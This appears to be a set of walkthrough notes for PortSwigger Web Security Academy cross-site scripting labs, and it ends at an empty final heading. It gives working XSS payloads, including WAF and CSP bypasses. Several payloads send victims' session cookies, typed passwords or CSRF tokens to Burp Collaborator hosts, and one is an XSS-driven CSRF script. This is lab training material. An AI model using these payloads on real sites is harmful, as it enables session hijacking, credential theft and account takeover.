# Portswigger
## Cross-site scripting (XSS)
- Cheat sheet
	- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- Simple
	- `<script>alert(document.domain)</script> `
	- `<img src=1 onerror=alert(1)>`

### Reflected XSS into HTML context with nothing encoded
```bash

# This lab contains a simple [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality.

# To solve the lab, perform a cross-site scripting attack that calls the 'alert' function.

Enter into the search prompt:

<script>alert(1)</script

```

### Exploiting cross-site scripting to steal cookies
```bash

# This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

#### To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

# Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.

Go to Burp -> Burp collaborator client -> Copy to clipboard
Click on "View post"
Enter comment:

<script>
fetch('https://hrc87qzjaj8kcumi1q2ob6vr6ic80x.oastify.com', {
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
</script>

Name:

name

Email:

email@email.com

Go to: Burp Collaborator client
Click "Poll now"
Choose the HTTP response "Type" -> Request to Collaborator -> Copy the sesssion value

I8y40dZuIyFs6hVATs3ka6TMcIk6U0MY

Take this session cookie and place it as your own "Cookie: session="


```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220517191525.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220517191129.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220517191443.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220517191410.png)

### Exploiting cross-site scripting to capture passwords
```bash

# This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.


<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://8z8jf2gg5fnphge8jxes7g30prvhj6.oastify.com', {
method: 'POST',
mode: 'no-cors',
body: username.value+':'+this.value
});">

Go to Burp -> Burp collaborator client -> Copy to clipboard
Click on "View post"
Enter comment:

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://8z8jf2gg5fnphge8jxes7g30prvhj6.oastify.com', {
method: 'POST',
mode: 'no-cors',
body: username.value+':'+this.value
});">

Name:

name

Email:

email@email.com

Go to: Burp Collaborator client
Click "Poll now"
Choose the HTTP response "Type" -> Request to Collaborator -> username:password

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220517192749.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220517192701.png)

### Exploiting XSS to perform CSRF
```bash

# This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.

# You can log in to your own account using the following credentials: `wiener:peter`

Login as wiener:peter
Update your email:

email@email.com

Go to: HTTP history 

POST /my-account/change-email HTTP/1.1

Note the hidden CSRF parameter

email=email%40email.com&csrf=LoD1CBSqXWwVWQfGNeigE8VO3V6yuB2k

Go to: "View post"

Comment:

<script> 
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account', true); 
req.send(); 
function handleResponse() { 
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
var changeReq = new XMLHttpRequest(); 
changeReq.open('post', '/my-account/change-email', true); 
changeReq.send('csrf='+token+'&email=test@test.com') }; 
</script>

Name:

name

Email:

email@email.com

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518001258.png)

### Stored XSS into HTML context with nothing encoded
```bash

# This lab contains a [stored cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the comment functionality.

# To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

Go to: "View post"
Add a comment
Comment:

<script>alert(1)</script>

Name:

name

Email:

email@email.com

```

### Reflected XSS into HTML context with most tags and attributes blocked
```bash

# This lab contains a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

# To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the WAF and calls the `print()` function.

# Your solution must not require any user interaction. Manually causing `print()` to be called in your own browser will not solve the lab.

Enter "<script>alert(1)</script>" into the search option
Note the response:

"Tag is not allowed"

Go to: HTTP history
Find:

GET /?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1

Send to intruder

GET /?search=<§§> HTTP/1.1

Utilize the "Copy tags to clipboard" functionality for "All tags" @

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Go to: Payloads
Payload Optionsp[Simple list]
Paste the "All tags" list
Start attack

body "200"
custom tabs "200"

Go to: Positions
Change:

GET /?search=<§§> HTTP/1.1

To

GET /?search=<body%20§§=1> HTTP/1.1

// or // decoded

GET /?search=<body+§§=1> HTTP/1.1

Go to:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Click "Copy events to clipboard"

Go to: Payloads
Payload Options[Simple list]
Clear
Paste
Start attack

oneresize "200"

Copy  the target end-point: 

"https://ac081f131e798290c00505d900b20068.web-security-academy.net/"

Go to: "Exploit server"
Craft a payload:

" = %22
< = %3c
> = %3e
+ = %20

Body:

<iframe src="https://ac081f131e798290c00505d900b20068.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E"
onload=this.style.width='100px'>

// or // decoded

<iframe src="https://ac081f131e798290c00505d900b20068.web-security-academy.net/?search="><body+onresize=alert(document.cookie)>"
onload=this.style.width='100px'>

Click "Store"
Click "Deliver exploit to victim"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518205138.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518205212.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518205239.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518205307.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518205702.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518212459.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518212523.png)

### Reflected XSS into HTML context with all tags blocked except custom ones
```bash

# This lab blocks all HTML tags except custom ones.

# To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that injects a custom tag and automatically alerts `document.cookie`.

Go to: "Exploit server"
Craft a payload:

= = %3d
( = %28
) = %29
< = %3c
> = %3e
+ = %20

Body:

<script>
location='https://acc01f9d1fc9d753c06c030300430099.web-security-academy.net/?search=%3Cxss%20id%3Dx%20%onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

// or // decoded

<script>
location='https://acc01f9d1fc9d753c06c030300430099.web-security-academy.net/?search=<xss+id=x+onfocus=alert(document.cookie)+tabindex=1>#x';
</script>

```

### Reflected XSS with event handlers and href attributes blocked
```bash

# This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked..

# To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

# Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example: 

# <a href="">Click me</a>

Craft a payload:

< = %3c
> = %3e
+ = %20

https://ac8e1f411e3cb19dc091085b009c00ff.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

// or // decoded

https://ac8e1f411e3cb19dc091085b009c00ff.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y>Click me</text></a>

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518232203.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518232222.png)

### Reflected XSS with some SVG markup allowed
```bash

#  This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

# To solve the lab, perform a cross-site scripting attack that calls the alert() function. 

Enter into the search bar:

<img src=1 onerror=alert(1)>

Response:

"Tag is not allowed"

Go to: HTTP history
Find:

GET /?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E HTTP/1.1

Send to intruder

GET /?search=<§§> HTTP/1.1

Go to:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Click "Copy tags to clipboard"
Go to: Payloads
Payload Options[Simple list]
Paste
Start attack

"200" status code:

animatetransform
image
svg
title

Payload Positions:

GET /?search=<svg><animatetransform%20§§=1> HTTP/1.1

Go to:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Click "Copy events to clipboard"
Go to: Payloads
Payload Options[Simple list]
Clear
Paste
Start attack

"200" status code:

onbegin

Craft a payload:

< = %3c
> = %3e
+ = %20

%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

// or // decoded

<svg><animatetransform onbegin=alert(1)>

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519000859.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518234811.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220518234758.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519000522.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519000541.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519002235.png)

### Reflected XSS into attribute with angle brackets HTML-encoded
```bash

# This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 

Input into search:

"123456"

Click "Search"
View page source
Ctrl+F

"123456"

On the second occurence note the value is in quotes "123456"

Input into search:

"onmouseover="alert(1)

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519005157.png)

### Stored XSS into anchor href attribute with double quotes HTML-encoded
```bash
# This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 

# <a href="javascript:alert(document.domain)">

Click "View post"
Intercept is on
Comment:

comment

Name:

name

email:

email@email.com

Website:

123456

Send to repeater
Intercept is off
Click "Go back to blog"
Intercept is on
Click "name" // The last comment by username "name"
Send to repeater
Intercept is off
Go to: Repeater
Clicking "name" end-point:

GET /123456 HTTP/1.1 // Name of website

Go to:

POST /post/comment HTTP/1.1

Change:

csrf=xJAdBTi5vpk8VQAjNmiVEzhPQIASt0cn&postId=8&comment=comment&name=name&email=email%40email.com&website=123456

To

csrf=xJAdBTi5vpk8VQAjNmiVEzhPQIASt0cn&postId=8&comment=comment&name=name&email=email%40email.com&website=javascript:alert(1)

Click "Follow redirection" // Does not seem to be necessary, but does not hurt. Also, manually click on the username "name" to verify

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519010733.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519012434.png)

### Reflected XSS in canonical link tag
```bash

# This lab reflects user input in a canonical link tag and escapes angle brackets.

# To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

# To assist with your exploit, you can assume that the simulated user will press the following key combinations:

#    ALT+SHIFT+X
#    CTRL+ALT+X
#    Alt+X

# Please note that the intended solution to this lab is only possible in Chrome. 

' = %27

Enter into the browser:

?%27accesskey=%27x%27onclick=%27alert(1)

// or // decoded

?'accesskey='x'onclick='alert(1)

Enter into browser:

https://ac5f1f561e8de3b6c064aaa9001c0022.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

Verify:
Shift+Ctrl+x (windows and linux)

```

### Reflected XSS into a JavaScript string with single quote and backslash escaped
```bash

# This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

# To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

Enter into the search:

123456

Go to: HTTP history

GET /?search=123456 HTTP/1.

Send to repeater
Search the response:

123456

Response:

var searchTerms = '123456';

Go to repeater
Enter into search:

123456'check

Like so:

GET /?search=123456'check HTTP/1.1

Search the response:

123456

Response:

var searchTerms = '123456\'check';

form a new get request:

GET /?search=</script><script>alert(1)</script> HTTP/1.1

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519180603.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519180704.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519180857.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519180919.png)

### Reflected XSS into a JavaScript string with angle brackets HTML encoded
```bash

# This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

Enter into the search:

{{check}}

Go to: HTTP history

GET /?search={{check}} HTTP/1.

Send to repeater
Search the response:

{{check}}

Response:

var searchTerms = '{{check}}';

Go to repeater
Enter into search:

'-alert(1)-'

Like so:

GET /?search='-alert(1)-' HTTP/1.1

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519212445.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519212856.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519212912.png)

#### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
```bash

# This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

# To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

Enter into the search:

123456

Go to: HTTP history

GET /?search=123456 HTTP/1.

Send to repeater
Search the response:

123456

Response:

var searchTerms = '123456';

Go to repeater
Enter into search:

\';alert(1)//

Like so:

GET /?search=\';alert(1)// HTTP/1.1

Response:

var searchTerms = '\\';
alert(1)//';

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519221102.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519221217.png)

### Reflected XSS in a JavaScript URL with some characters blocked
```bash

# This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent [XSS](https://portswigger.net/web-security/cross-site-scripting) attacks.

# To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function with the string `1337` contained somewhere in the `alert` message.

Add:

&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2B%27%27,{x:%27}

To

https://ac761fb11ea61ba6c0d4032c00ba00aa.web-security-academy.net/post?postId=3

Final:

https://ac761fb11ea61ba6c0d4032c00ba00aa.web-security-academy.net/post?postId=3&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2B%27%27,{x:%27}

```

##### Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
```bash

# This lab contains a [stored cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the comment functionality.

# To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

%26apos;-alert(1)-%26apos;

Go to: "View post"
Intercept is on
Enter:

Comment:

comment

Name:

name

Email:

email@email.com

Website:

http://123456

Click "Post Comment"
Send to repeater
Intercept is off
Click "Back to Blog"
Intercept is on
Refresh the page
Send to repeater
Intercept is off

<a id="author" href="http://123456" onclick="var tracker={track(){}};tracker.track('http://123456');">name

Change:

Website:

http://1212?&&apos;-alert(1)-&apos;

Click "Back to Blog"
Click on the last occurrence of username "name"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519223557.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519223652.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519224327.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220519224403.png)

#### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
```bash

# This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.

Enter into search "test"

Response:

var message = `2 search results for 'test'`;

Note the template literal

Enter into the search "${alert(1)}"

```

### DOM XSS in `document.write` sink using source `location.search`
```bash

# This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

# To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function.

Disclaimer: Go on Burp Suite Chromium built in browser to utilize the DOM invader
Go to: Extensions
Pin the Burp Suite icon to the taskbar
Dom invader is on: On
Inject canary into all sources is on: On
Input "check"
Update canary
Reload
Open developer tools:

Ctrl+Shift+i

Click "DOM Invader"

Note the visible sink:

document.write (1)
Due to the sink being within the "img src" tag use a double-quote and greater than sign to close this and create your own tag

"><svg onload=alert(1)>

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220520222120.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220520222246.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220520222325.png)

### Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element
```bash

# This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

# To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that breaks out of the select element and calls the `alert` function.

Disclaimer: Go on Burp Suite Chromium built in browser to utilize the DOM invader
Go to: Extensions
Pin the Burp Suite icon to the taskbar
Dom invader is on: On
Inject canary into all sources is on: On
Input "check"
Update canary
Reload
Open developer tools:

Ctrl+Shift+i

Click "DOM Invader"
On site:
Click "View details"
In developer tools:
Source (2) should now be visible
Click "Source (2)"
Note the "check" canary is placed into the "storeId" parameter and now shows up on the website in the drop-down menu for "Check stock"
Note the "document.write" sink

<option selected>checkcrf12</option>

Will change too:

<option selected></option><script>alert(1)</script>crf12</option>

Change:

https://ac681f951ea5b974c0ac3796006b000d.web-security-academy.net/product?productId=1

To

https://ac681f951ea5b974c0ac3796006b000d.web-security-academy.net/product?productId=1&storeId=</option><script>alert(1)</script>

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220520232116.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220520232923.png)

### DOM XSS in innerHTML sink using source location.search
```bash

# This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

# To solve this lab, perform a cross-site scripting attack that calls the alert function.

"The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements."

Disclaimer: Go on Burp Suite Chromium built in browser to utilize the DOM invader
Go to: Extensions
Pin the Burp Suite icon to the taskbar
Dom invader is on: On
Inject canary into all sources is on: On
Input "check"
Update canary
Reload
Open developer tools:

Ctrl+Shift+i

Click "DOM Invader"
On site:
Enter into search: "123456"
In developer tools:
Note the "element.innerHTML" and take into account the quoted text from Portswigger above
Enter into search: "<img src=1 onerror=alert(1)>"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220520233654.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220520233729.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220520233752.png)

### DOM XSS in jQuery anchor href attribute sink using location.search source
```bash

# This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

# To solve this lab, make the "back" link alert document.cookie.

Disclaimer: Go on Burp Suite Chromium built in browser to utilize the DOM invader
Go to: Extensions
Pin the Burp Suite icon to the taskbar
Dom invader is on: On
Inject canary into all sources is on: On
Input "check"
Update canary
Reload
Open developer tools:

Ctrl+Shift+i

Click "DOM Invader"
On site:
Go to: "Submit feedback"
In developer tools:
Note the sinks:

JQuery.attr.href (1)

element.setAttribute.href (1)

It seems anything in the "returnPath=" parameter will be executed
The value of "JQuery.attr.href (1)"

/postcheckwecnucheckv8

The "Submit feedback" end-point

https://ac791fad1e44e346c1586cda00a500bb.web-security-academy.net/feedback?returnPath=/post

Change:

https://ac791fad1e44e346c1586cda00a500bb.web-security-academy.net/feedback?returnPath=/post

To

https://ac791fad1e44e346c1586cda00a500bb.web-security-academy.net/feedback?returnPath=javascript:alert(1)

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220520235846.png)

### DOM XSS in jQuery selector sink using a hashchange event
```bash

# This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

# To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

"The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements."

"As the hash is user controllable, an attacker could use this to inject an XSS vector into the $() selector sink. More recent versions of jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character (#). However, you may still find vulnerable code in the wild."

Disclaimer: Go on Burp Suite Chromium built in browser to utilize the DOM invader
Go to: Extensions
Pin the Burp Suite icon to the taskbar
Dom invader is on: On
Inject canary into all sources is on: On
Input "check"
Update canary
Reload
Open developer tools:

Ctrl+Shift+i

Click "DOM Invader"
On site:
Go to: "Submit feedback"
In developer tools:
Note the sinks:

element.innerHTML (1)

Copy to clipboard the URL:

https://acfe1fd81fcbb3fcc0870fc000e300a1.web-security-academy.net/

Go to: "Exploit server"

Note the # at the end of the "vulnerable_webstite/#"
Body:

<iframe src="https://acfe1fd81fcbb3fcc0870fc000e300a1.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'">

Click "Store"
Click "Deliver exploit to victim"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521003051.png)

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
```bash

# This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

# AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

# To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.

Type into search: 

123456

View source or open developer tools and Ctrl+f search for string "123456"
Note that the search results are within the html body tag called 'np-app'
Type into search:

{{$on.constructor('alert(1)')()}}

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521210658.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521210905.png)

### Reflected DOM XSS
```bash

# This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

# To solve this lab, create an injection that calls the alert() function.

Type into search:

123456

Go to: HTTP history

GET /search-results?search=123456 HTTP/1.1

Note the response:

{
  "results":[
  ],
  "searchTerm":"123456"}
}

Go to: Target -> js -> searchResults.js
Check the response

Note the response has the "searchTerm" variable following the "searchResultsObj" by dot notation. Also, searchResultsObj is within eval function.
Response:

eval('var searchResultsObj = ' + this.responseText);

var searchTerm = searchResultsObj.searchTerm

Go to: HTTP history
Find:

GET /search-results?search=123456 HTTP/1.1

Send to repeater

Get:

GET /search-results?search=\"alert(1) HTTP/1.1

Response:

{"results":[],"searchTerm":"\\"alert(1)"}

Get:

GET /search-results?search=\"-alert(1)// HTTP/1.1

Response:

{"results":[],"searchTerm":"\\"-alert(1)//"}

Get:

GET /search-results?search=\"-alert(1)}// HTTP/1.1

Response:

{"results":[],"searchTerm":"\\"-alert(1)}//"}

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521213123.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521213047.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521214300.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521214325.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521214351.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521214210.png)

### Stored DOM XSS
```bash

# This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function. 

Click "View post"
Comment:

123456

Name:

name

Email:

email@email.com

Website:

http://123456

Go to: Target -> resources -> js -> loadCommentsWithVulnerableEscapeHtml.js

Change
Comment:

123456

To

<><img src=1 onerror=alert(1)>

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220521220430.png)

### Reflected XSS protected by very strict CSP, with dangling markup attack
```bash
# This lab using a strict CSP that blocks outgoing requests to external web sites.

# To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.

# You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:
# <a href="">Click me</a>

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Intercept is on
Change email:

email@email.com

Note the csrf token is input after the email paramater and value
Go to: Burp -> Burp Collaborator client -> Copy to clipboard
Go to: "Exploit server"
Body:

<script>
if(window.name) {
new Image().src='//j6qoyty1gsrao8s8eg4fx0jrjipadz.burpcollaborator.net?'+encodeURIComponent(window.name);
} else {
location='https://acee1f281ede2acec045519100e30075.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-aca21f871e5d2aa8c09c51f701620024.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>

// or // decoded

<script>
if(window.name) {
new Image().src='//j6qoyty1gsrao8s8eg4fx0jrjipadz.burpcollaborator.net?'+encodeURIComponent(window.name);
} else {
location='https://acee1f281ede2acec045519100e30075.web-security-academy.net/my-account?email="><a href="https://exploit-aca21f871e5d2aa8c09c51f701620024.web-security-academy.net/exploit">Click me</a><base target='';
}
</script>

Click "Store"
Click "Deliver exploit to victim"
Go to Burp Collaborator client
Click "Poll now"
Go to: HTTP request -> Request to collaborator
Find the csrf token

KfUUOzT02VRirqDGLy0uSnVitAiY57w2

Go to:

https://acee1f281ede2acec045519100e30075.web-security-academy.net/my-account

Intercept is on
Email:

hacker@evil-user.net

Right-click -> Engagement tools -> Generate CSRF PoC -> Options -> Include auto-submit script
Change the current csrf value to:

KfUUOzT02VRirqDGLy0uSnVitAiY57w2

Click "Regenerate"
"Copy HTML"
Go to: Exploit server
Body:

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acee1f281ede2acec045519100e30075.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="KfUUOzT02VRirqDGLy0uSnVitAiY57w2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

Click "Store"
Click "Deliver exploit to victim"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220522004152.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220522002838.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220522005034.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220522005118.png)

### Reflected XSS protected by CSP, with CSP bypass
```bash

# This lab uses CSP and contains a reflected XSS vulnerability.

# To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.

# Please note that the intended solution to this lab is only possible in Chrome.

**DISCLAIMER**
- COMPLETE ON CHROME/CHROMIUM

Type into search:

<img src=1 onerror=alert(1)>

Go to: HTTP history

GET /?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E HTTP/1.

Response:

Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=

%3c = <
%28 = (
%29 = )
%2f = /
%20 - +
%27 = '

=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

// or // decoded

=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'

Final Payload:

https://ac911f2f1e2fcd15c09e7ed800cf00ce.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220522010719.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220522010626.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220522011405.png)

### Reflected XSS with AngularJS sandbox escape without strings
```bash

